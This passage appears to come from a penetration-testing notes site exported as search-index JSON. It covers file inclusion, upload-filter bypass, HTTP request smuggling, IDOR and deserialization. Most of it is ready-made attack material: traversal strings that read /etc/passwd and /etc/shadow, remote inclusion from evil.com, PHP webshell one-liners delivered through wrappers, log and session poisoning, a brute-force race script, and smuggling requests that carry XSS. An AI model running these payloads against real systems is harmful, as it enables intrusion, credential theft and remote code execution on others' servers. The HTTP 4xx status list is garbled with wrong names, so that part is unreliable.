MORE]../../../../etc/passwd\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#filter-bypass-tricks","title":"Filter bypass tricks","text":"<pre><code>http://example.com/index.php?page=....//....//etc/passwd\nhttp://example.com/index.php?page=..///////..////..//////etc/passwd\nhttp://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#basic-rfi","title":"Basic RFI","text":"<p>Most of the filter bypasses from LFI section can be reused for RFI.</p> <pre><code>http://example.com/index.php?page=http://evil.com/shell.txt\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#null-byte_1","title":"Null byte","text":"<pre><code>http://example.com/index.php?page=http://evil.com/shell.txt%00\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#double-encoding_1","title":"Double encoding","text":"<pre><code>http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#bypass-allow_url_include","title":"Bypass allow_url_include","text":"<p>When <code>allow_url_include</code> and <code>allow_url_fopen</code> are set to <code>Off</code>. It is still possible to include a remote file on Windows box using the <code>smb</code> protocol.</p> <ol> <li>Create a share open to everyone</li> <li>Write a PHP code inside a file : <code>shell.php</code></li> <li>Include it <code>http://example.com/index.php?page=\\\\10.0.0.1\\share\\shell.php</code></li> </ol>"},{"location":"Pentesting/Web%20Application/file-inclusion/#lfi-rfi-using-wrappers","title":"LFI / RFI using wrappers","text":""},{"location":"Pentesting/Web%20Application/file-inclusion/#wrapper-phpfilter","title":"Wrapper php://filter","text":"<p>The part \"php://filter\" is case insensitive</p> <pre><code>http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\nhttp://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php\n</code></pre> <p>can be chained with a compression wrapper for large files.</p> <pre><code>http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\n</code></pre> <p>NOTE: Wrappers can be chained multiple times using <code>|</code> or <code>/</code>:</p> <ul> <li>Multiple base64 decodes: <code>php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s</code></li> <li>deflate then base64encode (useful for limited character exfil): <code>php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php</code></li> </ul> <pre><code>./kadimus -u \"http://example.com/index.php?page=vuln\" -S -f \"index.php%00\" -O index.php --parameter page \ncurl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d &gt; index.php\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#wrapper-zip","title":"Wrapper zip://","text":"<pre><code>echo \"&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/pre&gt;\" &gt; payload.php;  \nzip payload.zip payload.php;\nmv payload.zip shell.jpg;\nrm payload.php\n\nhttp://example.com/index.php?page=zip://shell.jpg%23payload.php\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#wrapper-data","title":"Wrapper data://","text":"<pre><code>http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=\nNOTE: the payload is \"&lt;?php system($_GET['cmd']);echo 'Shell done !'; ?&gt;\"\n</code></pre> <p>Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : <code>http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+</code></p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#wrapper-expect","title":"Wrapper expect://","text":"<pre><code>http://example.com/index.php?page=expect://id\nhttp://example.com/index.php?page=expect://ls\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#wrapper-input","title":"Wrapper input://","text":"<p>Specify your payload in the POST parameters, this can be done with a simple <code>curl</code> command.</p> <pre><code>curl -X POST --data \"&lt;?php echo shell_exec('id'); ?&gt;\" \"https://example.com/index.php?page=php://input%00\" -k -v\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#alternatively-kadimus-has-a-module-to-automate-this-attack","title":"Alternatively, Kadimus has a module to automate this attack.","text":"<pre><code>./kadimus -u \"https://example.com/index.php?page=php://input%00\"  -C '&lt;?php echo shell_exec(\"id\"); ?&gt;' -T input\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#wrapper-phar","title":"Wrapper phar://","text":"<p>Create a phar file with a serialized object in its meta-data.</p> <pre><code>// create new Phar\n$phar = new Phar('test.phar');\n$phar-&gt;startBuffering();\n$phar-&gt;addFromString('test.txt', 'text');\n$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');\n\n// add object of any class as meta data\nclass AnyClass {}\n$object = new AnyClass;\n$object-&gt;data = 'rips';\n$phar-&gt;setMetadata($object);\n$phar-&gt;stopBuffering();\n</code></pre> <p>If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked</p> <pre><code>class AnyClass {\n    function __destruct() {\n        echo $this-&gt;data;\n    }\n}\n// output: rips\ninclude('phar://test.phar');\n</code></pre> <p>NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, <code>file_exists</code> and many more.</p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#lfi-to-rce-via-procfd","title":"LFI to RCE via /proc/*/fd","text":"<ol> <li>Upload a lot of shells (for example : 100)</li> <li>Include http://example.com/index.php?page=/proc/\\(PID/fd/\\)FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)</li> </ol>"},{"location":"Pentesting/Web%20Application/file-inclusion/#lfi-to-rce-via-procselfenviron","title":"LFI to RCE via /proc/self/environ","text":"<p>Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file</p> <pre><code>GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1\nUser-Agent: &lt;?=phpinfo(); ?&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#lfi-to-rce-via-upload","title":"LFI to RCE via upload","text":"<p>If you can upload a file, just inject the shell payload in it (e.g : <code>&lt;?php system($_GET['c']); ?&gt;</code> ).</p> <pre><code>http://example.com/index.php?page=path/to/uploaded/file.png\n</code></pre> <p>In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf</p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#lfi-to-rce-via-upload-race","title":"LFI to RCE via upload (race)","text":"<p>Worlds Quitest Let's Play\"</p> <ul> <li>Upload a file and trigger a self-inclusion.</li> <li>Repeat 1 a shitload of time to:</li> <li>increase our odds of winning the race</li> <li>increase our guessing odds</li> <li>Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}</li> <li>Enjoy our shell.</li> </ul> <pre><code>import itertools\nimport requests\nimport sys\n\nprint('[+] Trying to win the race')\nf = {'file': open('shell.php', 'rb')}\nfor _ in range(4096 * 4096):\n    requests.post('http://target.com/index.php?c=index.php', f)\n\n\nprint('[+] Bruteforcing the inclusion')\nfor fname in itertools.combinations(string.ascii_letters + string.digits, 6):\n    url = 'http://target.com/index.php?c=/tmp/php' + fname\n    r = requests.get(url)\n    if 'load average' in r.text:  # &lt;?php echo system('uptime');\n        print('[+] We have got a shell: ' + url)\n        sys.exit(0)\n\nprint('[x] Something went wrong, please try again')\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#lfi-to-rce-via-phpinfo","title":"LFI to RCE via phpinfo()","text":"<p>PHPinfo() displays the content of any variables such as \\(\\_GET**, **\\)_POST and $_FILES.</p> <p>By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.</p> <p>Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)</p> <p>Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#lfi-to-rce-via-controlled-log-file","title":"LFI to RCE via controlled log file","text":"<p>Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.</p> <pre><code>http://example.com/index.php?page=/var/log/apache/access.log\nhttp://example.com/index.php?page=/var/log/apache/error.log\nhttp://example.com/index.php?page=/var/log/nginx/access.log\nhttp://example.com/index.php?page=/var/log/nginx/error.log\nhttp://example.com/index.php?page=/var/log/vsftpd.log\nhttp://example.com/index.php?page=/var/log/sshd.log\nhttp://example.com/index.php?page=/var/log/mail\nhttp://example.com/index.php?page=/var/log/httpd/error_log\nhttp://example.com/index.php?page=/usr/local/apache/log/error_log\nhttp://example.com/index.php?page=/usr/local/apache2/log/error_log\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#rce-via-ssh","title":"RCE via SSH","text":"<p>Try to ssh into the box with a PHP code as username <code>&lt;?php system($_GET[\"cmd\"]);?&gt;</code>.</p> <pre><code>ssh &lt;?php system($_GET[\"cmd\"]);?&gt;@10.10.10.10\n</code></pre> <p>Then include the SSH log files inside the Web Application.</p> <pre><code>http://example.com/index.php?page=/var/log/auth.log&amp;cmd=id\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#rce-via-mail","title":"RCE via Mail","text":"<p>First send an email using the open SMTP then include the log file located at <code>http://example.com/index.php?page=/var/log/mail</code>.</p> <pre><code>root@kali:~# telnet 10.10.10.10. 25\nTrying 10.10.10.10....\nConnected to 10.10.10.10..\nEscape character is '^]'.\n220 straylight ESMTP Postfix (Debian/GNU)\nhelo ok\n250 straylight\nmail from: mail@example.com\n250 2.1.0 Ok\nrcpt to: root\n250 2.1.5 Ok\ndata\n354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\nsubject: &lt;?php echo system($_GET[\"cmd\"]); ?&gt;\ndata2\n.\n</code></pre> <p>In some cases you can also send the email with the <code>mail</code> command line.</p> <pre><code>mail -s \"&lt;?php system($_GET['cmd']);?&gt;\" www-data@10.10.10.10. &lt; /dev/null\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#lfi-to-rce-via-php-sessions","title":"LFI to RCE via PHP sessions","text":"<p>Check if the website use PHP Session (PHPSESSID)</p> <pre><code>Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/\nSet-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly\n</code></pre> <p>In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files</p> <pre><code>/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.\nuser_ip|s:0:\"\";loggedin|s:0:\"\";lang|s:9:\"en_us.php\";win_lin|s:0:\"\";user|s:6:\"admin\";pass|s:6:\"admin\";\n</code></pre> <p>Set the cookie to <code>&lt;?php system('cat /etc/passwd');?&gt;</code></p> <pre><code>login=1&amp;user=&lt;?php system(\"cat /etc/passwd\");?&gt;&amp;pass=password&amp;lang=en_us.php\n</code></pre> <p>Use the LFI to include the PHP session file</p> <pre><code>login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#lfi-to-rce-via-credentials-files","title":"LFI to RCE via credentials files","text":"<p>This method require high privileges inside the application in order to read the sensitive files.</p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#windows-version","title":"Windows version","text":"<p>First extract <code>sam</code> and <code>system</code> files.</p> <pre><code>http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam\nhttp://example.com/index.php?page=../../../../../../WINDOWS/repair/system\n</code></pre> <p>Then extract hashes from these files <code>samdump2 SYSTEM SAM &gt; hashes.txt</code>, and crack them with <code>hashcat/john</code> or replay them using the Pass The Hash technique.</p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#linux-version","title":"Linux version","text":"<p>First extract <code>/etc/shadow</code> files.</p> <pre><code>http://example.com/index.php?page=../../../../../../etc/shadow\n</code></pre> <p>Then crack the hashes inside in order to login via SSH on the machine.</p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#references","title":"References","text":"<ul> <li> <p>https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/</p> </li> <li> <p>https://preetshah90.blogspot.com/2017/03/upcoming-directorypath-traversal-vs-lfi.html</p> </li> <li> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</p> </li> <li> <p>https://medium.com/@asfiyashaikh10/file-path-traversal-and-file-inclusions-7c567da9e226</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/file-upload-bypass/","title":"File Upload bypass","text":""},{"location":"Pentesting/Web%20Application/file-upload-bypass/#file-upload-bypass","title":"File Upload bypass","text":"<p>One common way to gain a shell is actually not really a vulnerability, but a feature! Often times it is possible to upload files to the webserver. This can be abused byt just uploading a reverse shell. The ability to upload shells are often hindered by filters that try to filter out files that could potentially be malicious. So that is what we have to bypass.</p>"},{"location":"Pentesting/Web%20Application/file-upload-bypass/#rename-shell","title":"Rename Shell","text":"<p>We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.</p> <p>php phtml, .php, .php3, .php4, .php5, and .inc</p> <p>asp asp, .aspx</p> <p>perl .pl, .pm, .cgi, .lib</p> <p>jsp .jsp, .jspx, .jsw, .jsv, and .jspf</p> <p>Coldfusion .cfm, .cfml, .cfc, .dbm</p>"},{"location":"Pentesting/Web%20Application/file-upload-bypass/#gif89a","title":"GIF89a;","text":"<p>If they check the content. Basically you just add the text \"GIF89a;\" before you shell-code. So it would look something like this:</p> <pre><code>GIF89a;system($_GET['cmd']);//or you can insert your complete shell code?&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-upload-bypass/#in-image","title":"In image","text":"<pre><code>exiftool -Comment='\"; system($_GET['cmd']); ?&gt;' lo.jpg\n</code></pre> <p>Exiftool is a great tool to view and manipulate exif-data. Then I had to rename the file</p> <p>mv lo.jpg lo.php.jpg</p>"},{"location":"Pentesting/Web%20Application/file-upload-bypass/#nullbyte","title":"Nullbyte","text":"<pre><code>filename.php%00\nfilename.php%00.png\nfilename.php%00.png%00.jpg\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-upload-bypass/#references","title":"References","text":"<ul> <li>\u200bhttp://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html\u200b</li> </ul>"},{"location":"Pentesting/Web%20Application/http-cheat-sheet/","title":"HTTP Cheat Sheet","text":""},{"location":"Pentesting/Web%20Application/http-cheat-sheet/#http-cheat-sheet","title":"HTTP Cheat Sheet","text":""},{"location":"Pentesting/Web%20Application/http-cheat-sheet/#http-authentication-types","title":"HTTP Authentication Types","text":"<ul> <li>Digest Authentication (uses htdigest)</li> </ul> <p>- susceptible to MITM attack!</p> <ul> <li>Integrated Windows Authentication</li> </ul> <p>- will not function over proxy</p> <ul> <li>Form-Based Authentication</li> </ul> <p>- not inherently encrypted, often poor implementation</p>"},{"location":"Pentesting/Web%20Application/http-cheat-sheet/#http-response-codes","title":"HTTP Response Codes","text":""},{"location":"Pentesting/Web%20Application/http-cheat-sheet/#informational-response-codes-1xx","title":"Informational Response Codes (1xx)","text":"<ul> <li> <p>100 - Continue</p> </li> <li> <p>101 - Switching Protocols</p> </li> <li> <p>102 - Processing</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/http-cheat-sheet/#success-response-codes-2xx","title":"Success Response Codes (2xx)","text":"<ul> <li> <p>200 - OK</p> </li> <li> <p>201 - Created</p> </li> <li> <p>202 - Accepted</p> </li> <li> <p>203 - Non-authoritative Info</p> </li> <li> <p>204 - No Content</p> </li> <li> <p>205 - Reset Content</p> </li> <li> <p>206 - Partial Content</p> </li> <li> <p>207 - Multi-status</p> </li> <li> <p>208 - Already Reported</p> </li> <li> <p>226 - IM Used</p> </li> <li> <p>250 - Low Storage Space</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/http-cheat-sheet/#redirection-response-codes-3xx","title":"Redirection Response Codes (3xx)","text":"<ul> <li> <p>300 - Multiple Choices</p> </li> <li> <p>301 - Moved Permanently</p> </li> <li> <p>302 - Found</p> </li> <li> <p>303 - See Other</p> </li> <li> <p>304 - Not Modified \u00a0</p> </li> <li> <p>304 - Not Modified \u00a0</p> </li> <li> <p>305 - Use Proxy</p> </li> <li> <p>307 - Temporary Redirect</p> </li> <li> <p>308 - Permanent Redirect</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/http-cheat-sheet/#client-error-response-codes-4xx","title":"Client Error Response Codes (4xx)","text":"<ul> <li> <p>400 - Multiple Choices</p> </li> <li> <p>401 - Moved Permanently</p> </li> <li> <p>402 - Found</p> </li> <li> <p>403 - See Other</p> </li> <li> <p>404 - Multiple Choices</p> </li> <li> <p>405 - Moved Permanently</p> </li> <li> <p>406 - Found</p> </li> <li> <p>407 - See Other</p> </li> <li> <p>408 - Found</p> </li> <li> <p>409 - See Other</p> </li> <li> <p>410 - Not Modified</p> </li> <li> <p>411 - Use Proxy</p> </li> <li> <p>412 - Temporary Redirect</p> </li> <li> <p>413 - Permanent Redirect</p> </li> <li> <p>414 - Not Modified</p> </li> <li> <p>415 - Use Proxy</p> </li> <li> <p>416 - Temporary Redirect</p> </li> <li> <p>417 - Permanent Redirect</p> </li> <li> <p>418 - Temporary Redirect</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/http-cheat-sheet/#server-error-response-codes-5xx","title":"Server Error Response Codes (5xx)","text":"<ul> <li> <p>500 - Internal Server Error</p> </li> <li> <p>501 - Not Implemented</p> </li> <li> <p>502 - Bad Gateway</p> </li> <li> <p>503 - Service Unavailable</p> </li> <li> <p>504 - Gateway Timeout</p> </li> <li> <p>505 - HTTP Ver Not Supported</p> </li> <li> <p>506 - Variant Also Negotiates</p> </li> <li> <p>507 - Insufficient Storage</p> </li> <li> <p>508 - Loop Detected</p> </li> <li> <p>509 - Bandwidth Limited</p> </li> <li> <p>510 - Not Extended</p> </li> <li> <p>511 - Network Auth Required</p> </li> <li> <p>550 - Permission Denied</p> </li> <li> <p>551 - Option Not Supported</p> </li> <li> <p>598 - Network Read Timeout Error</p> </li> <li> <p>599 - Network Connect Timeout Error</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/","title":"HTTP request smuggling","text":""},{"location":"Pentesting/Web%20Application/http-request-smuggling/#http-request-smuggling","title":"HTTP request smuggling","text":""},{"location":"Pentesting/Web%20Application/http-request-smuggling/#what-is-http-request-smuggling","title":"What is Http Request Smuggling","text":"<p>HTTP request smuggling is a web application vulnerability that exploits inconsistencies in how front-end and back-end servers interpret and process HTTP requests. By manipulating the headers and content of HTTP requests, attackers can trick intermediaries like proxies or web servers into misinterpreting the boundaries between requests, leading to discrepancies in how requests are handled. This can result in various attacks such as cache poisoning, session fixation, or unauthorized access to sensitive data.</p>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#background","title":"Background","text":"<p>Before even going to start about HTTP request smuggling we first need to understand how modern websites work.</p> <ol> <li>The user makes a request to a front-end server(Can be a reverse proxy or load balancer).</li> <li>For efficiency and performance, multiple HTTP requests are sent in one TCP network connection.</li> <li>The front-end server forwards the request to the backend server.</li> <li>The backend server parses the multiple HTTP requests on the basis of HTTP request headers to determine the new request.</li> </ol>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#headers-to-watch-out","title":"Headers to watch out","text":"<p>There are two important headers in the HTTP request that tells the server where the request ends.</p> <ol> <li>The Content-Length header</li> <li>The Transfer-Encoding header</li> </ol> <p>These same headers are important to perform a successful HTTP request smuggling attack.</p>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#transfer-encoding-header","title":"Transfer-Encoding Header","text":"<p>The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.  Almost all the time we will use chunked encoding to perform the attack.</p>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#chunked","title":"Chunked","text":"<p>As per Mozilla,</p> <p>Data is sent in a series of chunks. The Content-Length header is omitted in this case and at the beginning of each chunk you need to add the length of the current chunk in hexadecimal format, followed by '<code>\\r\\n</code>' and then the chunk itself, followed by another '<code>\\r\\n</code>'.  </p> <pre><code>HTTP/1.1 200 OK\nContent-Type: text/plain\nTransfer-Encoding: chunked\n\n7\\r\\n\nMozilla\\r\\n\n9\\r\\n\nDeveloper\\r\\n\n7\\r\\n\nNetwork\\r\\n\n0\\r\\n\n\\r\\n\n</code></pre>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#content-length-header","title":"Content-Length Header","text":"<p>As the name suggests content-length header specifies the number of bytes present in the message body.</p> <pre><code>POST /smuggled HTTP/1.1\nHost: unstable.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\n x=anything\n</code></pre> <p>As per the HTTP specifications, both the \"Content-Length\" and \"Transfer-Encoding\" header can be used in a single HTTP request. Although in the specification it is also mentioned that the \"Content-Length\" header should be ignored by the backend server if transfer encoding header is used. This can be useful only if one server is in the picture.</p>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#attack-types","title":"Attack types","text":"Type Front-end Backend CL.CL Content-Length Content-Length CL.TE Content-Length Transfer-Encoding TE.CL Transfer-Encoding Content-Length TE.TE Transfer-Encoding Transfer-Encoding"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#clcl","title":"CL.CL","text":"<p>In this type of attack two \"Content-Length\" header is used. According to RFC, if two \"Content-Length\" headers are used with no sign of the \"transfer-Encoding\" header then the server should throw an unrecoverable error. But modern web servers especially which sit behind the reverse proxies might support this and causes the smuggling attack to be a successful vector.</p> <pre><code>GET /ping HTTP/1.1\nContent-Length: 35\nContent-Length: 0\nHost: unstable.com\n\nGET /smuggled HTTP/1.1\nHost: unstable.com\n</code></pre> <p>In the above HTTP request, the proxy will prioritize the first \"Content-Length\" header and will treat the smuggled request as a normal part of the body. Yes, even though it's a GET request and two \"Content-Length\" headers are provided. When This is parsed by the backend server, the first \"Content-Length\" header will be ignored, and the second will be given as a priority.</p> <p>Since we mentioned the value of the second header is \"0\" the server will not expect any request body and it will be treated as a normal pipeline request. Therefore the response to this smuggled request will be received by another user.</p>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#clte","title":"CL.TE","text":"<p>In this attack, the front-end server uses the \"Content-Length\" header, and the backend server uses the \"Transfer-Encoding\" header.</p> <pre><code>POST / HTTP/1.1\nHost: unstable.com\nContent-Length: 7\nTransfer-Encoding: chunked\n\n0\n\nasdasd\n</code></pre> <ol> <li>The front-end server will process the \"Content-Length\" header and will determine the length \"7\" up to the \"asdasd\".</li> <li>The backend server will process the request by prioritizing the \"Transfer-Encoding\" header and sees the message body is chunked encoded. It will process the first chunk which is \"0\" and will terminate the request. The remaining body \"asdasd\" will remain unprocessed and will be used as part of the next pipeline HTTP request.</li> </ol>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#response","title":"Response","text":"<pre><code>HTTP/1.1 404 Not Found\nConnection: Close\nContent-Length: 0\n\n\"Unrecognized method asdasdPOST\"\n</code></pre>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#example","title":"Example","text":"<pre><code>POST / HTTP/1.1\nHost: unstable.com\nContent-Length: 7\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: unstable.com\nContent-Length: 7\n\nasdasd\n</code></pre>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#tecl","title":"TE.CL","text":"<p>As of now, you might have guessed that the front-end server will use \"Transfer-Encoding\" and the backend server will use the \"Content-Length\" header.</p> <pre><code>POST / HTTP/1.1\nHost: unstable.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n6\nasdasd\n0\n</code></pre> <ol> <li>The front-end server will process the \"Transfer-Encoding\" header and will parse the message body using chunked encoding. The first chunk is 6 bytes long which is \"asdasd\".  It then goes to the next chunk which is \"0\" in the size and hence it terminates the request. Then the request will be forwarded to the backend server.</li> <li>The backend server will use the \"Content-Length\" header and determines that the request body is 3 bytes long, up to the start of the line following 6. The remaining part of the body will remain unprocessed.</li> <li>The backend server will treat the remaining bytes as a start of the new HTTP request.</li> </ol>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#tete","title":"TE.TE","text":"<p>Here, the front-end and back-end servers both support the \"Transfer-Encoding\" header, but one of the servers can be induced not to process it by obfuscating the header in some way.  To uncover a TE.TE vulnerability, it is necessary to find some variation of the \"Transfer-Encoding\" header such that only one of the front-end or back-end servers processes it, while the other server ignores it.</p> <p>Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated \"Transfer-Encoding\" header, the remainder of the attack will take the same form as for the CL.TE or TE.CL vulnerabilities already described.</p>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#obfuscation-and-bypasses","title":"Obfuscation and bypasses","text":"<p>There are potentially endless ways to obfuscate the \"Transfer-Encoding\" header, here are some of the examples:</p> <pre><code>Transfer-Encoding: xchunked\n</code></pre> <pre><code>Transfer-Encoding : chunked\n</code></pre> <pre><code>Transfer-Encoding: chunked\nTransfer-Encoding: x\n</code></pre> <pre><code>Transfer-Encoding:[tab]chunked\n</code></pre> <pre><code>[space]Transfer-Encoding: chunked\n</code></pre> <pre><code>X: X[\\n]Transfer-Encoding: chunked\n</code></pre> <pre><code>Transfer-Encoding\n: chunked\n</code></pre> <pre><code>Transfer-Encoding : \\x00chunked\n</code></pre> <pre><code>Transfer-Encoding: ch\u00f9nked\n</code></pre> <pre><code>Foo: bar\\r\\n\\rTransfer-Encoding: chunked\n</code></pre>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#xss-using-http-request-smuggling","title":"XSS using HTTP request smuggling","text":"<p>The obvious prerequisite is webpage should be vulnerable to Reflected XSS. Then you can use HTTP request smuggling to perform and increase the impact of the attack.\\ When you have XSS on \"User-Agent\" header you can use something like below,</p> <pre><code>POST / HTTP/1.1\nHost: unstable.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\nCookie: xyz=asd\nContent-Type: application/x-www-form-urlencoded\nTransfer-Encoding: chunked\nContent-Length: 213\nConnection: keep-alive\n\n0\n\nGET /xss HTTP/1.1\nHost: unstable.com\nUser-Agent: '\"&gt;&lt;script&gt;alert(\"xss\")&lt;/script&gt;\nContent-Length: 10\nContent-Type: application/x-www-form-urlencoded\n\nasdasd\n</code></pre>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#tools","title":"Tools","text":"<ul> <li> <p>https://github.com/defparam/smuggler</p> </li> <li> <p>https://github.com/ZeddYu/HTTP-Smuggling-Lab</p> </li> <li> <p>https://github.com/gwen001/pentest-tools</p> </li> <li> <p>https://github.com/anshumanpattnaik/http-request-smuggling</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/http-request-smuggling/#references","title":"References","text":"<ul> <li> <p>https://portswigger.net/web-security/request-smuggling</p> </li> <li> <p>https://blog.detectify.com/2020/05/28/hiding-in-plain-sight-http-request-smuggling/</p> </li> <li> <p>https://hackerone.com/reports/737140</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/idor/","title":"Insecure direct object references (IDOR)","text":""},{"location":"Pentesting/Web%20Application/idor/#insecure-direct-object-references-idor","title":"Insecure direct object references (IDOR)","text":""},{"location":"Pentesting/Web%20Application/idor/#what-is-idor","title":"What is IDOR?","text":"<p>Insecure Direct Object References(IDOR) occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability, attackers can bypass authorization and access resources in the system directly, for example, database records or files.</p>"},{"location":"Pentesting/Web%20Application/idor/#idor-handbook","title":"IDOR Handbook","text":"<ul> <li>IDOR Handbook</li> </ul>"},{"location":"Pentesting/Web%20Application/idor/#burp-extensions","title":"Burp Extensions","text":"<ul> <li> <p>Authz - https://portswigger.net/bappstore/4316cc18ac5f434884b2089831c7d19e</p> </li> <li> <p>AuthMatrix - https://portswigger.net/bappstore/30d8ee9f40c041b0bfec67441aad158e</p> </li> <li> <p>Autorize - https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/idor/#references","title":"References","text":"<ul> <li> <p>https://www.youtube.com/watch?v=rloqMGcPMkI</p> </li> <li> <p>https://portswigger.net/web-security/access-control/idor</p> </li> <li> <p>https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE/blob/master/10-part-100-article/exploit/How-To:%20Find%20IDOR%20(Insecure%20Direct%20Object%20Reference)%20Vulnerabilities%20for%20large%20bounty%20rewards.pdf</p> </li> <li> <p>https://ninadmathpati.com/how-critical-is-idor-vulnerability-can-it-take-down-a-whole-company/</p> </li> <li> <p>https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489</p> </li> <li> <p>https://medium.com/cyberverse/automating-burp-to-find-idors-2b3dbe9fa0b8</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/insecure-deserialization/","title":"Insecure Deserialization","text":""},{"location":"Pentesting/Web%20Application/insecure-deserialization/#insecure-deserialization","title":"Insecure Deserialization","text":""},{"location":"Pentesting/Web%20Application/insecure-deserialization/#background-information","title":"Background Information","text":"<ul> <li> <p>Serialization is the process of converting complex data structures, such as objects and their fields, into a \"flatter\" format that can be sent and received as a sequential stream of bytes.</p> </li> <li> <p>Deserialization is the 